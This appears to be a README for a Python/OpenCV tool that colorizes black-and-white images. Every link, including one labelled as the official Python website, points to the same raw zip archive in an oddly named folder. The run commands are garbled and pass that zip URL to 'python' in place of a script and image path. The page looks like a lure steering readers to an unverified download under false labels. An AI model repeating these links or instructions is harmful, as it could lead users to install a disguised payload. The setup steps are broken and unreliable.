# üé® Colorize-Black-White-Images-using-OPEN-CV - Color Your Black and White Images Easily

[![Download Colorize-Black-White-Images](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)

## üì¶ Introduction

This project allows you to add color to black and white images using deep learning. It uses OpenCV‚Äôs DNN with a pre-trained Caffe model. You have two options for running the program: a script-based workflow or a Tkinter-based GUI. Both methods are simple and designed for anyone to use.

## üöÄ Getting Started

Follow these steps to easily download and run the software.

### üñ•Ô∏è System Requirements

- **Operating System**: Windows, macOS, or Linux.
- **RAM**: At least 4 GB of RAM.
- **Python**: Python 3.6 or higher.
- **OpenCV**: OpenCV 4.0 or higher. The GUI version requires Tkinter.
  
### üì• Download & Install

You can download the application from the Releases page. Click the link below to visit the page:

[Download Colorize-Black-White-Images](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)

Once on the page, find the latest release version. You will see an option for the installation files. Choose the file that matches your operating system and click to download.

### üõ†Ô∏è Installing Dependencies

Before running the application, you may need to install some software:

1. **Python**: If you do not have Python installed, download it from the official [Python website](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip).
2. **Pip**: This tool comes with Python but can also be installed separately.

Once you have Python, you can use pip to install OpenCV. Open a terminal or command prompt and run:

```bash
pip install opencv-python
pip install opencv-python-headless
```

### üé¨ Running the Application

You have two options for using the application: via the script or the GUI.

#### 1. Using the Script

If you prefer the command line, follow these steps:

1. Open a terminal or command prompt.
2. Navigate to the folder where you saved the application.
3. Run the following command:

```bash
python https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip
```

Replace `https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip` with the path to the black and white image you want to colorize.

#### 2. Using the GUI

If you prefer a graphical interface, you can use the Tkinter GUI:

1. Download and extract the application files, if you haven't done so already.
2. Open a terminal or command prompt.
3. Navigate to the folder where you saved the application.
4. Run the GUI with:

```bash
python https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip
```

5. A window will open. Click on the "Upload" button to choose your image. Then click "Colorize" to see the result.

## üåà Features

- Easy-to-use interface for both command line and GUI.
- Fast image processing using deep learning techniques.
- High-quality colorization for various types of black and white images.

## üõ†Ô∏è Troubleshooting

If you encounter any issues:

- Ensure that you have the right version of Python and OpenCV installed.
- Confirm that your image file paths are correct.
- For GUI issues, ensure Tkinter is properly installed.

To install Tkinter, you can usually run:

For Windows:

```bash
pip install tk
```

For macOS and Linux, Tkinter often comes pre-installed with Python.
